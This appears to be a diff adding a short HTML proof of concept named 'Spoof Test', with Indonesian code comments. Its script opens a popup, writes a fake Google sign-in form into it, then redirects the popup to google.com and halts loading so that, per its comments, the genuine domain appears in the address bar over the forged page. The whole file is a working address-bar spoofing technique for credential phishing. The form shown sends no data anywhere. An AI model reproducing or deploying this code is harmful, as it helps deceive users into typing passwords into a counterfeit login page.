@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Spoof Test</title>
+</head>
+<body>
+  <button onclick="runSpoof()">Run Spoof</button>
+
+  <script>
+    function runSpoof() {
+      let win = window.open("", "", "width=800,height=600");
+
+      let fakeContent = `
+        <html>
+          <head><title>Google Login</title></head>
+          <body style="font-family:Arial;text-align:center;">
+            <h2>Sign in to your Google Account</h2>
+            <form>
+              <input placeholder="Email" /><br><br>
+              <input placeholder="Password" type="password" /><br><br>
+              <button type="submit">Next</button>
+            </form>
+          </body>
+        </html>
+      `;
+
+      // Tampilkan konten palsu
+      win.document.write(fakeContent);
+      win.document.close();
+
+      // Delay, lalu redirect ke domain sah
+      setTimeout(() => {
+        try {
+          win.location = "https://google.com";  // Domain asli muncul di address bar
+        } catch (e) {
+          console.warn("Redirect error:", e);
+        }
+
+        // Gunakan setInterval untuk menghentikan loading
+        let interval = setInterval(() => {
+          try {
+            win.stop(); // Hentikan loading, konten palsu tetap muncul
+            clearInterval(interval);
+          } catch (e) {}
+        }, 100);
+      }, 100);
+    }
+  </script>
+</body>
+</html>
